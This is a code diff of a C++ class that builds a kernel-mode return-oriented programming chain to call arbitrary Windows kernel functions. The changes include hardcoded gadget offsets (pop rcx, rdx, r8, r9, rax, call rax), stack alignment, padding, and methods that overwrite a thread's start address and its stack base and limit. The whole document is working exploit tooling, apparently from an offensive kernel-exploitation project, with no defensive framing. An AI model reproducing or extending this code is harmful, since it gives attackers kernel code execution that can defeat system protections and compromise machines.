@@ -27,26 +27,17 @@ public:
 
     std::uint64_t* GetStackBuffer();
     std::size_t GetStackSize();
-    void AddGadget(const std::uint64_t GadgetOffset);
-    void AddValue(const std::uint64_t Value);
+    void AddGadget(const std::uint64_t GadgetOffset, const std::string_view& GadgetLogName);
+    void AddValue(const std::uint64_t Value, const std::string_view& ValueLogName);
     void AddPadding(const std::size_t PaddingSize = 8);
     void ModifyThreadStartAddress(const std::uint64_t NewStartAddress);
+    void ModifyThreadStackBaseAndLimit(const std::uint64_t NewStackBase, const std::uint64_t NewStackLimit);
 
     template<typename... Args>
     void AddFunctionCall(const std::string_view& FunctionName, Args&&... args)
     {
         constexpr std::size_t ArgCount = sizeof...(Args);
         const std::uint64_t FunctionAddress = Driver::GetKernelFunctionOffset(FunctionName);
-
-        std::uintptr_t PopRaxGadget = 0x210e10; // pop rax; ret;
-
-        // For this gadget, we must account for the 'add rsp, 8' by adding 8 byte padding so that it doesn't side-effect our stack
-        std::uintptr_t CallRaxGadget = 0x6a9edf; // call rax; nop dword ptr [rax]; add rsp, 8; ret;
-
-        std::uintptr_t PopRcxGadget = 0x256c4a; // pop rcx; ret;
-        std::uintptr_t PopRdxGadget = 0x3cca89; // pop rdx; ret;
-        std::uintptr_t PopR8Gadget = 0x2f7921; // pop r8; ret;
-        std::uintptr_t PopR9Gadget = 0x6b4f23; // pop r9; ret;
 
         // Setup ropchain for arguments only if there are any
         if constexpr (ArgCount > 0)
@@ -55,36 +46,43 @@ public:
 
             if (ArgCount >= 1)
             {
-                this->AddGadget(PopRcxGadget);
-                this->AddValue(ConvertedArgs[0]);
+                this->AddGadget(0x256c4a, "pop rcx; ret;"); // pop rcx; ret;
+                this->AddValue(ConvertedArgs[0], "FirstArg");
             }
 
             if (ArgCount >= 2)
             {
-                this->AddGadget(PopRdxGadget);
-                this->AddValue(ConvertedArgs[1]);
+                this->AddGadget(0x3cca89, "pop rdx; ret;"); // pop rdx; ret;
+                this->AddValue(ConvertedArgs[1], "SecondArg");
             }
 
             if (ArgCount >= 3)
             {
-                this->AddGadget(PopR8Gadget);
-                this->AddValue(ConvertedArgs[2]);
+                this->AddGadget(0x2f7921, "pop r8; ret;"); // pop r8; ret;
+                this->AddValue(ConvertedArgs[2], "ThirdArg");
             }
 
             if (ArgCount >= 4)
             {
-                this->AddGadget(PopR9Gadget);
-                this->AddValue(ConvertedArgs[3]);
+                this->AddGadget(0x6b4f23, "pop r9; ret;"); // pop r9; ret;
+                this->AddValue(ConvertedArgs[3], "FourthArg");
             }
         }
 
-        // Setup ropchain for actual function call.
-        // We pop function address into rax, then call it and keep an 8-byte padding
-        // for the gadget's side effect
-        this->AddGadget(PopRaxGadget);
-        this->AddGadget(FunctionAddress);
-        this->AddGadget(CallRaxGadget);
-        this->AddPadding(8);
-        //Stack->push_back(0xDEADBEEFDEADBEEF); // Our return address
+        if (this->GetStackSize() % 16 == 0)
+            this->AddGadget(0x20043b, "ret (align)");
+
+        //this->AddGadget(FunctionAddress, "Function to call address");
+        //this->AddGadget(0xbad76a, "add rsp, 0x20; ret;");
+        //this->AddValue(0, "Shadow space 1");
+        //this->AddValue(0, "Shadow space 2");
+        //this->AddValue(0, "Shadow space 3");
+        //this->AddValue(0, "Shadow space 4");
+
+        this->AddGadget(0x210e10, "pop rax; ret;"); // pop rax; ret;
+        this->AddValue(KernelModuleBase + FunctionAddress, "Function to call addr");
+        //this->AddGadget(0x20043b, "ret;"); // ret; (align rsp)
+        this->AddGadget(0x52c005, "call rax; nop dword ptr [rax]; add rsp, 0x28; ret;"); // call rax; nop dword ptr [rax]; add rsp, 0x28; ret;
+        this->AddPadding(0x28);
     }
 };
